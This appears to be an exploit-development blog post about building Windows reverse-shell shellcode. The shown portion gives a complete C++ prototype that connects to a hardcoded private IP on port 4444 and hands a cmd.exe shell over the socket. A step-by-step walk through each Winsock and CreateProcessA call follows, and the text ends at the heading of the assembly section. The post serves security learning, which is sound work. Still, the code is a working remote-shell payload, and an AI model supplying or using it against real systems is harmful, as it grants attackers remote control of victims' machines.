---
layout: single
title: Win32 Reverse Shell Shellcode 
date: 2019-10-19
classes: wide
header:
  teaser: /assets/images/avatar.jpg
tags:
  - Shellcode
  - Windows
  - C++ 
  - Assembly
  - Reverse Shell 
  - Socket Programming
---

## Introduction
After creating some basic shellcode where we popped calc.exe and figured out at least one method to dynamically find the address of DLLs and their exported functions, it was time to make something a bit more involved, so I went through and created a Reverse Shell PoC payload. 

## Recommended Reading
I used/copied a lot of techniques from the following resources:

+ [Marcos Valle's Reverse Shell Shellcode](https://marcosvalle.github.io/re/exploit/2018/10/21/windows-manual-shellcode-part3.html)
+ [sh3llc0d3r's Reverse Shell Shellcode](http://sh3llc0d3r.com/windows-reverse-shell-shellcode-i/)
+ [NytroRST's Introduction to Windows Shellcode Development](https://securitycafe.ro/2016/02/15/introduction-to-windows-shellcode-development-part-3/)

I combined a lot of the different strategies discussed in the blogposts. The former two use hardcoded addresses discovered with Arwin, while we're going to try and dynamically locate our function addresses. We will also use a technique I found in this [ExploitDB](https://www.exploit-db.com/exploits/40334#) entry authored by Roziul Hasan Khan Shifat to store addresses before calling them. 

Make sure you read this material or you will be lost!

## Getting Started
I'm not going to rehash much of what we have done previously since we've covered it numerous times. I will instead focus on the new aspects, especially the socket programming aspects. 

### C++ Prototype 
Let's establish a reverse-shell via a C++ program first so we know roughly what we need to accomplish. I used the MSDN documentation, Ma~Far$'s [example](https://code.sololearn.com/c9QMueL0jHiy/#cpp), and [this Medium article by Bank Security](https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15) as references. Here is my completed C++ prototype:
```c
#include <Winsock2.h>
#include <Windows.h>
#include <iostream>


int main () 
{

std::string rem_host = "192.168.1.222";
int rem_port = 4444;

WSADATA wsaData;

// Call WSAStartup()
int WSAStartup_Result = WSAStartup(MAKEWORD(2,2), &wsaData);
if (WSAStartup_Result != 0) {
    std::cout << "[-] WSAStartup failed.";
    return 1;
}

// Call WSASocket()
SOCKET mysocket = WSASocketA(2, 1, 6, NULL, 0, NULL); 

// Create sockaddr_in struct
struct sockaddr_in sa;
sa.sin_family = AF_INET;
sa.sin_addr.s_addr = inet_addr(rem_host.c_str());
sa.sin_port = htons(rem_port);

// Call connect()
int connect_Result = connect(mysocket, (struct sockaddr*) &sa, sizeof(sa));
if (connect_Result !=0 ) {
    std::cout << "[-] connect failed.";
    return 1;
}

// Call CreateProcessA()
STARTUPINFO si;
memset(&si, 0, sizeof(si));
si.cb = sizeof(si);
si.dwFlags = (STARTF_USESTDHANDLES);
si.hStdInput = (HANDLE)mysocket;
si.hStdOutput = (HANDLE)mysocket;
si.hStdError = (HANDLE)mysocket;
PROCESS_INFORMATION pi;
CreateProcessA(NULL, "cmd", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);

}
```

We'll break this down by function. 

### WSAStartup
[This function](https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-wsastartup) initializes the utilization of the Winsock dll. Here we are giving it an argument of "2.2" as for the version to use, and we're also passing a reference to a `WSADATA` type variable `wsaData`. 

It returns a non-zero if it fails, so we've added some error handling to our program. 

### WSASocketA
[This function](https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsasocketa) creates a socket. We give ours the arguments `2, 1, 6, NULL, 0, NULL`:
+ `2` == AF_INET (IPv4)
+ `1` == SOCK_STREAM (TCP)
+ `6` == IPPROTO_TCP (TCP)
+ `NULL` == no value for `lpProtocolInfo`
+ `0` == since we don't have an existing "socket group" 
+ `NULL` == no value for `dwFlags`

We store the returned value, which is a file descriptor (`int`) to our newly created socket. 

### Connect
[This function](https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-connect) establishes a connection to a specific socket. The second argument is a pointer to a `sockaddr` structure, so let's create that first. 
```c++
struct sockaddr_in sa;
sa.sin_family = AF_INET;
sa.sin_addr.s_addr = inet_addr(rem_host.c_str());
sa.sin_port = htons(rem_port);
```

Our struct is called `sa`. The `sin_family` member is `AF_INET` again. The `s_addr` member of the `sin_addr` struct is set to our remote host. (We have to include the `.c_str()` function because we initialized the `rem_host` variable as an `std::string` and the `inet_addr` function only accepts proper C char arrays. Finally, we use `htons()` to translate our `rem_port` variable into the `sin_port` member of the struct. 

Only other thing I want to point out here is that we typecast the pointer to our `sockaddr_in` struct to `sockaddr`, with `(struct sockaddr*) &sa`, as that's what's expected by the `connect` function. 

### CreateProcessA
At this point, we've already connected to the remote host, now it's time to send a command shell to the "server" application. We've covered the `CreateProcessA` [function](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa) pretty in-depth previously. I just want to point out a few things that we'll be doing in the shellcode that differs from our previous examples. 

In order to have the command shell streams redirected to our connection, we need to initialize several members of the `STARTUPINFORMATION` structure. We typecast our socket file descriptor (`mysocket`) as a `HANDLE` and assign it to: `hStdInput`, `hStdOutput`, `hStdError`. We just now have to set `dwFlags` to `STARTF_USESTDHANDLES` which has a great name that tells you exactly what we're doing here. We're using the standard i/o handles, which we just set. `STARTF_USESTDHANDLES` specifies in the MSDN documentation that the *"handles must be inheritable and the function's bInheritHandles parameter must be set to TRUE."*

So we're poised to push our command shell and redirect standard i/o to it as long as we handle the actual `CreateProcessA` arguments appropriately now. 

`CreateProcessA(NULL, "cmd", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);`

As you can see, we have a `BOOL` value in our arguments that's set to `TRUE`. This is the aforementioned `bInheritHandles` parameter and we've set it appropriately to complete our prototype. Everything else in `CreateProcessA` is similar to what we've already done. 

## Assembly Time
